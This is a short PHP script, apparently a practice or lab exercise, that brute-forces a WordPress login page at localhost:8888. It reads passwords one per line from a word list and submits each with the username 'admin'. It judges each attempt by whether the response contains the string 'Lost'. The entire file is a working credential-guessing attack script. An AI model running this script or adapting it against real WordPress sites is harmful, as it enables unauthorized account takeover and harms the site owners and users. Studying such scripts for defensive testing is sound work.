<?php
require 'get_web_page.php';

$username = "admin";
$password = "password";

$url = 'http://localhost:8888/wp-login.php';

echo "\n";


$fileHere = fopen("smallList.txt", "r") or die ("Cant open file!");
while(!feof($fileHere)){
    echo "----------------------------------\n";
    echo "New one                           \n";
    echo "----------------------------------\n";
    $password = fgets($fileHere);
    //echo "The current password we are trying is ... " . fgets($fileHere);
    echo "The current password we are trying is ... " . $password;
    echo "\n";
    $resultFromCurl = get_web_page( $url, $username, $password);
    //this confirmed we are now returning a result each time
    //print_r($resultFromCurl['content']);

    $needle = "Lost";
    $checker = strpos($resultFromCurl['content'], $needle);

    //if checker is true
    if($checker !== false){
        echo "The value of checker is " . $checker . "\n";
    }
    //if checker is false
    else{
        echo "Checker is false and it looks like this: " . $checker ."\n";
    }

}
echo "\n";
fclose($fileHere);
